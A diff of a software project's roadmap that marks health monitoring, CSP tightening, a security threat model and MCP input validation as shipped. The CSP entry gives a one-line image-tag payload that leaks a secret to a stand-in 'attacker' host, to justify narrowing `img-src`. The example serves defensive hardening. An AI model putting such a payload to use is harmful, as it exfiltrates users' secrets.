@@ -385,17 +385,30 @@ deepen Workflow 2. Each is independent and opt-in to pick up; grouped by theme.
   sandboxed iframes, there's no a11y story: iframe titles, focus order across
   cards, contrast on the tone chips, screen-reader labels on the decision queue. A
   deliberate WCAG pass is table stakes. _Effort: medium._
-- **Operational observability** — the CLI installs showcase as a launchd/systemd
-  service, but there's no `/api/health`, no structured logging, and update-check
-  failures are silent. Add a health endpoint, structured request logging, and a
-  self-rendered "board status" surface (uptime, surface/asset counts, store size,
-  last error) — showcase dogfooding its own monitoring. _Effort: low–medium._
-- **Tighten the html-part CSP + write down the threat model** — the sandbox
-  invariant is solid. The CDN allowlist and `connect-src` are now gone (parts run
-  inline-only with no external origins), but `img/media` still allow wide
-  `https:`/`data:`/`blob:` sources. Narrow those, add a `docs/SECURITY.md` threat
-  model, and wire the `security-review` skill into a recurring check.
-  _Effort: low–medium._
+- **✅ Shipped — Operational observability.** The CLI installs showcase as a
+  launchd/systemd service but had no liveness signal. Now an owner-scoped
+  **`GET /api/health`** reports `{ status, uptimeMs, version, board, lastError }`
+  — liveness plus the board tally plus the last unhandled error (message + when;
+  `app.onError` records it, `status` flips `ok`→`degraded`), surfaced as
+  **`showcase health`** (human one-liner + `--json`). **Structured request
+  logging** is an opt-in middleware (one JSON line per `/api`/`/mcp` request —
+  method · path · status · ms; `/api/health` excluded so a polling monitor
+  doesn't flood it), wired from `SHOWCASE_LOG=1` in `index.ts` and off by default
+  so the local board stays quiet. Covered by API + CLI tests. _Remaining (cut for
+  now): a self-rendered "board status" surface — `showcase health` covers the
+  need; revisit only if an in-board monitoring card is wanted. Update-check
+  failures staying silent is intentional (this fork has no published release)._
+- **✅ Shipped — Tightened the html-part CSP + wrote the threat model.** `img-src`
+  / `media-src` dropped the wildcard **`https:`** scheme (both `buildCsp` and
+  `buildRichCsp` in `surfacePage.ts`): a bare `https:` source is a URL-borne
+  exfil channel even with scripts boxed and `connect-src` closed
+  (`<img src="https://attacker/?b=<secret>">`), so images/media are now `data:` /
+  `blob:` / this board's `origin` only — no external host appears anywhere in the
+  policy. Backed by `test/surfacePage.test.ts` regression assertions (no wildcard
+  scheme in img/media). The full trust model — invariant, sandbox attribute, CSP,
+  the host bridge, auth, CSRF guard, residual risks — is now **`docs/SECURITY.md`**
+  (linked from `AGENTS.md`), which also records the maintenance rule: run the
+  `security-review` skill over any diff touching the sandbox/CSP/bridge/auth.
 
 **Extensibility ergonomics**
 
@@ -565,17 +578,33 @@ already advertises **resources** (`showcase://surface/<id>`) and **prompts**
 - **One schema, two transports** ✅ — `mcpSpec.ts` now lives in `@showcase/core`
   as the single source of truth for tool schemas + field docs + prompt text; both
   the stdio server (`packages/mcp`) and `mcpHttp.ts` import it from there.
-- **Typed + validated** — every tool input/output backed by a `zod` schema with
-  structured, actionable error responses (not stringly-typed failures). _(Remaining.)_
-- **Round-trip completeness** — `get_surface` (content read-back) is shipped; extend
-  resources to **sessions** and **assets**, and confirm `update_surface` in-place
-  revision stays the iterate path. Keep tool descriptions excellent — the agent's
-  behavior is downstream of them.
-- **Per-tool tests** on both transports (extend `test/api.test.ts`'s "mcp read-back"
-  to cover each tool + resource + prompt), so the spec can't drift from either
-  transport.
+- **Typed + validated** ✅ — the stdio transport already validated via the SDK;
+  the hand-rolled streamable-HTTP transport now does too. `mcpSpec.ts` exports
+  `HTTP_MCP_TOOL_SCHEMAS` (one zod schema per tool, reusing the stdio shapes +
+  the HTTP routing envelope) and `validateToolInput`/`formatZodIssues`; `mcpHttp.ts`
+  validates each `tools/call` before dispatch and returns a structured
+  **`-32602 invalid arguments for <tool>: <field>: <issue>`** instead of a
+  stringly-typed failure deep in a flow. Part-bearing fields (`parts`,
+  `decisions`, `manifest`, preset bodies) stay LOOSE on purpose — the publish flow
+  and `coerceReview` already coerce/validate them leniently — so the gate checks
+  the envelope + scalar enums without false-rejecting a valid chart/code/json part.
+- **Round-trip completeness** ✅ — resources now cover **sessions**
+  (`showcase://session/<id>` → metadata + surface index) and **assets**
+  (`showcase://asset/<id>` → bytes as a base64 blob) on BOTH transports, alongside
+  the existing surfaces; `resources/templates/list` advertises all three. A new
+  owner-scoped `GET /api/sessions/:id/assets` (metadata only) backs the stdio
+  asset listing (the thin client can't reach the store); stdio asset reads fetch
+  the bytes via an authed binary `fetchAssetBlob`. `get_surface` + `update_surface`
+  remain the read→revise iterate path.
+- _Remaining (optional):_ extend the per-tool test matrix to the stdio transport
+  process directly (the HTTP transport + shared core are covered in
+  `test/api.test.ts`), and keep tool descriptions sharp.
+- **Per-tool tests** ✅ (HTTP) — `test/api.test.ts` covers the input-validation
+  gate (missing field, bad enum, loose-part pass-through) and the session/asset
+  resource list + read; the stdio-process matrix is the optional remainder above.
 - Consider, only if a need shows up: **elicitation/sampling** for the comment→agent
-  loop, and an MCP-level health/capability probe.
+  loop. (An MCP-level health probe is now covered by `/api/health` / `showcase
+  health`.)
 
 ##### Move 3 — best-in-class viewer (`packages/viewer`)
 
